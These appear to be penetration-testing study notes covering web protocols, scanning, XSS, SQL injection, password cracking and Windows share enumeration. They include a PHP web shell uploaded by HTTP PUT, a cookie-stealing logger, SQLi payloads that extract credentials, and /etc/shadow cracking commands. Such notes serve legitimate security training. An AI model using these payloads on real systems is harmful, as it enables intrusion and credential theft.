## 1.3 Web Apps 🌍

### HTTP Basics 📨

[HTTP Message Format](https://www.rfc-editor.org/rfc/rfc9110.html)

```
<HTTP_VERB> <PATH> <PROTOCOL_VERSION>\r\n
<HEADERS>\r\n
\r\n
Message Body\r\n
```

Where, `<HTTP_VERB>` can be GET, PUT, TRACE, HEAD, POST, DELETE, and more!

Where, `<HEADERS>` is in the key-value format and separated by `\r\n`.

```
Header-name: header-value
```

#### Request Headers

* Host : [URI](https://www.w3.org/TR/uri-clarification/) ; useful for a server that hosts multiple websites
* User-Agent : tells browser, OS, web engine, etc. versions
* Accept : document type (e.g. `text/html`)
* Accept-Language : human language localization
* Accept-Encoding : content encoding (e.g. compression)
* Connection : connection options

#### Response Headers

```
<PROTOCOL_VERSION> <HTTP_STATUS_CODE> <HTTP_TEXTUAL_MEANING>
<HEADERS>\r\n
\r\n
<PAGE_CONTENT>
```

* Date : response timestamp
* Cache-Control : set cache policy ; prevents re-requesting unmodified content
* Content-Type : response type (analogous to `Accept` header from request)
* Content-Encoding : response encoding (analogous to `Accept-Encoding` from request)
* Server : identify service (e.g. Apache, nginx, etc.)
* Content-Length : length of <PAGE_CONTENT> in Bytes

##### Status Codes

* 200 OK : good request
* 301 Moved Permanently : resource requests has been moved permanently
* 302 Found : resource exists under a different URI
* 403 Forbidden : client does not have enough privileges
* 404 Not found : server cannot find requested resource
* 500 Internal Server Error : server lacks the capability to handle the request

### HTTPS (HTTP with SSL/TLS) 🔒

Only protects against HTTP traffic interception, but not server exploits  
[SSL/TLS Guide by Apache](https://httpd.apache.org/docs/2.2/ssl/ssl_intro.html)

### Cookies 🍪

HTTP is stateless, which means the server does not keep track of requests.  
[Cookies](https://www.rfc-editor.org/rfc/rfc6265) are needed and used to maintain state between requests (i.e. maintain a "logged in" status). These are sent in the header as seen below:

Response format:

* Set-Cookie: content ; expiration date ; path ; domain ; optional flags (e.g. HttpOnly, Secure, etc.)

Request format:

* Cookie: " ... "

If `domain` is unset, then it will be automatically set by the server's domain and sets the cookie "host-only" flag, which means that cookie will be sent only to that exact hostname

Scope of a cookie is set by the `path` and `domain` attributes

Cookie path is recursively inclusive downwards (but not upwards)

"http-only" flag allows only HTML technology to read the cookie but not JavaScript, Flash, Java, etc. and prevents XSS

"Secure" flag only sends cookies over HTTPS

Typically, cookies are installed from a user login

### Sessions 🗝️

Session cookies store state on the server side via a "session ID" or token. These can replace a normal cookie (which prevents storing data on the client's side).

* SESSION : session cookie
* PHPSESSID : PHP session cookie
* JSESSIONID : JavaScript cookie

### Same Origin Policy 🚧

Prevents JavaScript from getting/setting properties on a resource from a different origin via. The browser must match all of the following in order to allow JS to change a resource:

* Protocol
* Hostname
* Port

i.e. protocol://hostname:port

HTML can still include external resources (just not JS if SOP is enabled)

## MITM Proxies (tools) 🕵️

* [Burp suite](https://portswigger.net/burp)
  - Can crawl an entire website
  - Modify HTTP requests and responses
* [OWASP ZAP](https://owasp.org/www-project-zap/)

## 1.4 PenTesting 🛡️

### Lifecycle 🔄

1) Engagement

- Get all details, including boundaries, dates, etc., during this phase
- Quotation: defines the fee for the work
  - type of engagement (black, grey, white box)
  - time billed
  - complexity of applications and services
  - scope: number of targets (IP address, domains, etc.)
  - total cost
  - a **lawyer** and/or **professional insurance** may be necessary
- Proposal: understand clients requirements and constraints along with the approach to achieve this (automated/manual testing)
  - Word this in terms of **risks and benefits** (business continuity, improved data/info confidentiality, avoidance of money/reputation loss
- Non-Disclosure Agreement (NDA): protects sensitive information encountered
- Rules of Engagement: time window, contacts/POCs, goals/objectives

2) Info Gathering

- do **NOT** start before time window
- Business info (names and emails):
  - board of directors
  - investors
  - managers and employees
  - locations and addresses
- Infrastructure info:
  - transform IP address/domains to servers/OS + more
  - (sub)domains; webpages (website crawling); technologies like PHP, Java, .NET; frameworks/content managers like Drupal, Joomla, Wordpress

3) Footprinting and Scanning

- ID OSes, services, and their versions
- detect hosts -> port scan via [nmap](https://nmap.org/)

4) Vulnerability Assessment

- discern list of vulnerabilities per target
- CAUTION: narrow down vulnerability scans (by OS, ports, etc.) to prevent service crashing and runtime

5) Exploitation

- validate previously found vulns via exploitation

6) Reporting

- share results with:
  - executives
  - IT staff
  - dev team
- report items:
  - techniques used
  - vulnerabilities found
  - exploits used
  - impact and risk analysis for each vuln
  - remediation tips  <==== **REAL VALUE FOR CLIENT**
    - **USEFUL SUGGESTION/TECHNIQUES** are more valuable than exploitation skills
- save report in encrypted location or destroy all work data
- stick to the process to maintain organization and focus while not freaking out

## 2.1 C++ 💻

### Basics

```c++
#include <iostream>
using namespace std; // prevent needing std:: everywhere
cout << "hi there" << endl; // prints output
cin >> variable_name ; // get user input

cin.ignore(); // keep console open (may need 2)
```

### Pointers

By default, C++ uses **call by value**.
Other languages might use **call by reference**.

```c++
type *variable_name;

x = &y; // store pointer location
x = *y; // store pointer value
```

## 2.2 Python3 🐍

Socket example

```python
import socket

SRV_ADDR = "0.0.0.0"
SRV_PORT = 44444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)
print("Server started! Waiting for connections...")
connection, address = s.accept()
print('Client connected with address:', address)
while 1:
    data = connection.recv(1024)
    if not data: break
    #connection.sendall(b'-- Message Received --\n')
    print(data.decode('utf-8'))
connection.close()
```

## 3.1 Information Gathering 🔍

- use social networks
  - LinkedIn
  - Facebook
  - Twitter
  - Crunchbase (requires subscription)
- government contractor
  - [GSA](https://www.gsaelibrary.gsa.gov/ElibMain/home.do)
- general internet database
  - WhoIs `whois` command
- browse client's website
- tools:
  - [DNS Dumpster (DNS assocations)](https://dnsdumpster.com/)
  - [Sublist3r (subdomains)](https://github.com/aboul3la/Sublist3r)

## 3.2 Footprinting and Scanning 🕵️‍♂️

1) Figure out IP address space range
2) Enumerate live hosts via [ICMP](https://www.rfc-editor.org/rfc/rfc792) ping sweep (Type 8 - echo request) ; usually blocked but maybe not inside of the LAN

### `fping`

```shell
# CIDR can be: 10.54.12.0/24 OR 10.54.12.0 10.54.12.255
fping --alive --generate <CIDR> 2>/dev/null  # generates alive target list while ignoring host unreachable
```

### `nmap`

- [Nmap Reference Guide](https://nmap.org/book/man.html)
  - [Performance tweaking](https://nmap.org/book/man-performance.html)
  - [Remote OS detection](https://nmap.org/book/osdetect.html)
- [Offline p0f Fingerprinting](https://lcamtuf.coredump.cx/p0f3/)
- Maybe promising: https://github.com/scipag/vulscan
  - https://github.com/apathetics/Ethical-Hacking-Final-Project/blob/master/myScript.py

```shell
# <CIDR> can be: 10.54.12.0/24 OR 10.54.12.1-12 OR 10.54.12.* OR 10.54.12-13.* OR 10.14.33,34,35.1,3,17
nmap -sn <CIDR>  # ping scan only
# -iL <FILE> : file listing of IP addresses

nmap -O <CIDR>  # OS fingerprinting scan ; will ping first without "-Pn"

# GIGA SCAN
nmap -T4 -sV -O <CIDR>  # with parallelization and only hosts that are up (via ICMP Ping ; modify for non-pingable "up" hosts)

# ---

HOST DISCOVERY:
 -sL: List Scan - simply list targets to scan
 -sn: Ping Scan - disable port scan
 -Pn: Treat all hosts as online -- skip host discovery
 -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
 -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
 -PO[protocol list]: IP Protocol Ping

OUTPUT:
 -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
    and Grepable format, respectively, to the given filename.

OS DETECTION:
 -O: Enable OS detection
 --osscan-limit: Limit OS detection to promising targets
 --osscan-guess: Guess OS more aggressively

SERVICE/VERSION DETECTION:
 -sV: Probe open ports to determine service/version info
 --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
 --version-light: Limit to most likely probes (intensity 2)
 --version-all: Try every single probe (intensity 9)
 --version-trace: Show detailed version scan activity (for debugging)
```

### TCP 3-way handshake 🤝

- 3-way handshake: `SYN -> SYN+ACK -> ACK`: normal way to establish TCP connection; port is open!
- `SYN -> RST+ACK`: port is closed
- SYN scan: `SYN -> SYN+ACK -> RST`: close port before finishing 3-way handshake and avoiding logs!

**`SYN` only scans typically do not leave logs!**

### Scan Types 🔍

- `-sT`: TCP connect scan (3-way handshake)
  - **logs in application/service logs**
- `-sS`: SYN scan (stealth scan)
  - still detectable by good IDS, but usually not service
- `-sV`: service version detection scan
  - uses `-sT` with other probes so **it logs and it's loud**
- `-p <PORT_RANGE>`: scan port(s)

## 3.3 Vulnerability Assessment 🛠️

- if doing vuln assessment only, then this is a linear process without feedback (via exploitation and cycling) where those vulns cannot be confirmed

### Example Scanners 🧰

- [OpenVAS](https://www.openvas.org/)
- [Nexpose](https://www.rapid7.com/products/nexpose/)
- [LanGuard](https://www.gfi.com/products-and-solutions/network-security-solutions/gfi-languard)
- [Nessus](https://www.tenable.com/products/nessus)
- [Nmap recommended top vuln scanners](https://sectools.org/tag/vuln-scanners/)

#### Nessus

- Uses a client/server model where the client configures and tasks scans while thserver performs them

## 3.4 Web App Attacks 🕸️

- big rocks:
  - web service
  - version
  - OS

### Webapp Fingerprinting Techniques 🕵️‍♀️

#### Banner grabbing

- NOTE: this works for HTTP only (not HTTPS)
- [OpenSSL[(https://www.openssl.org/)

```shell
# HTTP-only
echo -e 'HEAD / HTTP/1.0\r\n\r\n' | nc --verbose <IP_ADDRESS> <PORT>
# HTTPS (NOT GOOD)
echo -e 'HEAD / HTTP/1.0\r\n\r\n' | openssl s_client -connect <IP_ADDRESS>:<PORT>

# Signature-based fingerprinting
httprint -P0 -s /usr/share/httprint/signatures.txt -h <IP_ADDRESS>
```

- Look for `Server:` header to enumerate service + version

#### HTTP Verbs

- **DON'T FORGET the `\r\n\r\n` at the end of each request**
- **The `Host:` parameter is NOT needed for `HTTP/1.0`
- HTTP verbs sometimes depend on the `Host:` probed

- GET: pass args in the location

```shell
GET /page.php?course=ABC HTTP/1.1
Host: www.example.site
```

- POST: params must be in the message body

```shell
POST /login.php HTTP/1.1
Host: www.example.site


username=hotdog&password=abc123
```

- HEAD: similar to HET

```shell
HEAD / HTTP/1.1
Host: www.example.site
```

- PUT: upload files to server
  - must know the size of the file
  - can use `wc --chars <FILENAME>` to get file size
  - see below

```shell
PUT /path/to/destination HTTP/1.1
Host: www.example.site
Content-type: text/html
Content-length: 20


<?php phpinfo(); ?>
```

- DELETE: remove files from server
  - can be used to remove remote files

```shell
DELETE /path/to/destination HTTP/1.1
Host: www.example.site
```

- OPTIONS: enumerate all enabled HTTP verbs
  - check for `Allow:` response

```shell
OPTIONS / HTTP/1.1
Host: www.example.site
```

#### PHP Shell 🐘

- PHP Shell code for arbitrary commands
- This is less common for website, **BUT** still very common for IOT devices

##### payload.php

```shell
wc -m payload.php
# 140 payload.php
```

- HTTP request

```shell
nc www.example.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 140


<?php
if (isset($_GET['cmd']))
{
  $cmd = $_GET['cmd'];
  echo '<pre>';
  $result = shell_exec($cmd);
  echo $result;
  echo '</pre>';
}
?>
```

##### Commands to Webshell

```shell
www.example.site/payload.php?cmd=ls
www.example.site/payload.php?cmd=echo 'hi there' > /tmp/hotdog
```

#### Dirs/Files Enumeration 📂

- 2 methods to discern possible files:
  - brute-force (very hard and lame) ; on the order of millions/billions
  - dictionary attack of common file names ; maybe only a few thousands
- [DirBuster](https://www.kali.org/tools/dirbuster/)

```shell
# Run in background w/ 100 threads and save report to file
dirbuster -t 100 -l /usr/share/dirbuster/wordlists/directory-list*medium.txt -H -r dirbuster_report.txt -u <URL>
```

## 4.5 Google Dorks 🔎

Using search engines to search for tasty resources or login areas.

- References:
  - [Google Hacking Databse (exploitdb)](https://www.exploit-db.com/google-hacking-database)
  - [Google's Programmable Search Engine](https://developers.google.com/custom-search/docs/xml_results)

### Useful search commands

- `site:` include results from specific domains only
- `intitle:` filter from page title
- `inurl:` filter from contains in URL
- `filetype:` filters by file type
- `AND, OR, &, |` join same operators e.g. `site:derp.com OR site:dog.com`
- `-KEYWORD` filter out by KEYWORD keyword

```shell
# Search for admin logins per domain
inurl: admin intitle: login site:example.com

-inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf
```

## 4.6 Cross Site Scripting (XSS) 🦠

- [XSS](https://owasp.org/www-community/attacks/xss/) happens with unfiltered user input to build the web output/content that the server should validate! **NEVER TRUST USER INPUT -- always SANITIZE**
- User input being stolen:
  - Request headers
  - Cookies
  - Form inputs
  - POST/GET parameters
- XSS requires a vuln web app, so it needs a victim to allow the exploit
- The XSS allows for malicious code to be ran on the victim's computer
- **XSS typically ignored since harmless pop-up boxes are usually used to show impact**
  - Do MORE than a pop-up box to show impact

### Find XSS

- Look at **EVERY** user input
- Find a reflection point (where input gets outputed)
- Test things such as HTML tags to see if they work
  - e.g. Search for "<i>test" and note if the "test" string is italicized to demonstrate that the input is not sanitized
  - `<script>alert('[+] SUCCESS! Vuln!')</script>`
  - `<script>alert(document.cookie)</script>`
  - Cookie stealing

```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
```

- Types of XSS:
  - reflected: payload is inside of the request sent by victim; input gets reflected as output
    - malicious links or phishing e.g. `victim.site/search.php?find=<PAYLOAD>`
    - Google Chrome has built-in reflected XSS filter
  - persistent: payload is sent and stored by server
    - payload is delivered every time the page is browsed
    - HTML forms that submit content to the server and show it back to the user like comments, user profiles, and forum posts
  - DOM based

## 3.4 SQL Injections (SQLi) 💉

Access backend databases that typically store creds, data, transactions, and more

### SQL General Syntax

- [SQL Reference](https://www.w3schools.com/sql/sql_intro.asp)
- Result is technically a subtable of the database/table queried

```sql
# Basic
SELECT column FROM table WHERE key='value' ;

# Unioned
SELECT x UNION SELECT y ;
```

- SQL uses `#` or `--` as comments

### SQL Examples

```sql
# return just single row
SELECT Name, Description FROM Products WHERE ID='1' ;
SELECT Name, Description FROM Products WHERE Name='Shoes' ;

# return 3rd item and all usernames and passwords
SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts ;

# return chosen data
SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT 'Example', 'Data' ;
```

### PHP w/ SQL Example

```php
$hostname='1.2.3.4';
$user='user';
$pass='pass';
$database='mydatabase';

// get query parameter from GET param 'id: blah'
$id = $_GET['id'];

$connection = mysqli_connect($hostname, $user, $pass, $database);
$query = "SELECT Name, Description FROM Products WHERE ID='$id' UNION SELECT Username, Password FROM Accounts;";

$results = mysqli_query($connection, $query);
display_results($results);
```

**TRY BOTH True AND False CONDITTIONS**
- setting `$id` to something like `' OR 'a'='a` then becomes:
  - `SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';
  - which will return all `Products`
- `' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a`
  - results in creds!

- Using Burp to analyze and manipulate headers (e.g. for logins to SQLi)

### Exploiting Boolean Based SQLi

```sql
mysql> select user();
mysql> select substring('blah', 2, 1);
mysql> select substring(user(), 1, 1) = 'r';

# payload iterations start at a, b, c, ...
' OR substr(user(), 1, 1) = 'a
# once the the first letter is known, try the second at a, b, c, …
' OR substr(user(), 2, 1) = 'a
```

```sql
# extra dash is d/t some browsers removing trailing spaces and this preserves the comment
SELECT description FROM items WHERE id='' UNION SELECT user(); -- -';

# more HTTP queries to discern number of fields/columns
' UNION SELECT null; -- -
' UNION SELECT null, null; -- -
' UNION SELECT null, null, null; -- -

# SQLi examples
' UNION SELECT elsid1, elsid2; -- -
' UNION SELECT user(), elsid2; -- -
```

### SQLMap 🗺️

- Warning: SQLMAP might choose bad, automatic exploit parameters or crash services

```shell
# POST header uses '--data' option
sqlmap -u <URL> -p <INJECTION_PARAMTER> [--data=<POST_STRING>] [options]

# example: test parameter 'id:' with the UNION technique
sqlmap -u 'http://www.hotdog.com/view.php?id=1337' -p id --technique=U
```

## 3.5 System Attacks 🖥️

### Malware 🦠

- virus: code that spreads without authorization across computers
- trojan: embedded code in a seemingly harmless file
  - backdoor: background, unknown access for operator usu client/server
    - reverse/beacon: malware beacons back to operator
    - forward/connect: malware listen for connections from operator
- rootkit: hides from users and sometimes AV or kernel as well to subvert standard OS functions (syscalls)
- bootkits: embeds into bootloader
- adware: displays ads
- spyware: collects user activity such as OS version, visited websites, passwords
- greyware: malware that is not exclusive to a specific category
- dialers: antiquated malware that would dial numbers via dial-up connections to collect money from phone bills
- keylogger: collects keyboard strokes usu for creds
- bots: installed on internet-connected machines for DDOS/spam
- ransomware: encrypts computer harddrives and holds data hostage usu for ransom
- worms: exploit vulnerabilities and spread (automatically) to more hosts

### Password Attacks 🔓

- only way to reverse a hash truly is via brute-forcing (assuming the hashing algorithm does not have an exploit)

#### John the Ripper

- [John the Ripper](https://www.openwall.com/john/) is a brute-force and dictionary password cracker for many platforms
  - using a dictionary can take down the [keyspace](https://howsecureismypassword.net/) a few orders of magnitude (i.e. from billions to just millions of password possibilities)
  - [Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
    - or: `sudo apt install -y seclists` for wordlists in `/usr/share/seclists/Passwords/`

```shell
# Get list of possible cracking formats
john --list=formats

# must merge user and pass first
unshadow /etc/passwd /etc/shadow > crackme

# crack via brute-force, optionally against certain users
john -incremental [-users:<USERS>] crackme
# dictionary attack, rules will do some basic mangling
john -wordlist=/usr/share/john/password.lst [-rules] [-users:<USERS>] crackme

# show (cached) results
john --show crackme
```

#### ophcrack

- [ophcrack](https://ophcrack.sourceforge.io/) rainbow table cracking tool for Windows only (requires downloaded rainbow tables as well)

### Buffer Overflow Attacks 💥

- buffer: finite area in RAM for temporary data storage (e.g. user input, video, web browser responses, etc.) ; these are typically stored in a `stack` (LIFO) data structure

#### Buffer

```shell
 _____________________
| Vars
|_____________________|
| Base Pointer
|_____________________|
| Return Address
|_____________________|
| Function Parameters
|_____________________|
```

## 3.6 Network Attacks 🌐

### Authentication Cracking 🗝️

- [Password Collections](https://wiki.skullsecurity.org/index.php/Passwords) in addition to Seclists

#### Hydra

- fast, parallelized, network authentication cracker for many services

```shell
# Get detailed module info
hydra -U <MODULE>

# Launch dictionary attack using a user/pass list
hydra -L user.txt -P pass.txt <options> <service://server>
```

#### Windows Shares 🪟

- enabled through the service `File and Printer Sharing`
- NetBIOS: Windows host and share discovery (name resolution) protocol
  - 137/UDP: names, for finding workgroups
  - 138/UDP: datagrams, to list shares and machines
  - 139/TCP: session, to transmit shares data
- Windows Vista+ can have `Public` shares
- locations are UNC like `\\<SERVER>\<SHARE_NAME>\<FILE>`
- built-in administrative shares:
  - `C$`: allows admin access to local filesystem (and other volumes have their own as well)
  - `admin$`: windows installation directory
  - `ipc$`: unbrowseable via Explorer and used for process IPC

##### Null Sessions

- allows connecting to a share without authentication; only works for older Windows boxes for `IPC$` share

###### Tools

* DOS:

```shell
# Windows NetBIOS tool for host discovery/enumeration
nbtstat -A <IP_ADDRESS>

# Records from output
<00>    : workstation
<20>    : file sharing enabled

# enumerate shares
net view <IP_ADDRESS>

# Null session
net use \\<IP_ADDRESS>\IPC$ '' /u:''
```

* Linux: using the [Samba](https://www.samba.org/) tool suite

```shell
# nbtstat equivalence
nmblookup -A <IP_ADDRESS>

# Enumerate shares ; '-N' is do not ask for password
smbclient -L -N //<SERVER>

# Null session
smbclient -N //<SERVER>/IPC$
```

* [Enum](https://packetstormsecurity.com/search/?q=win32+enum&s=files): additional Windows program to enumerate shares, users, and policy via null session

```shell
# Shares
enum -S <IP_ADDRESS>

# Users
enum -U <IP_ADDRESS>

# Password policy
enum -P <IP_ADDRESS>
```
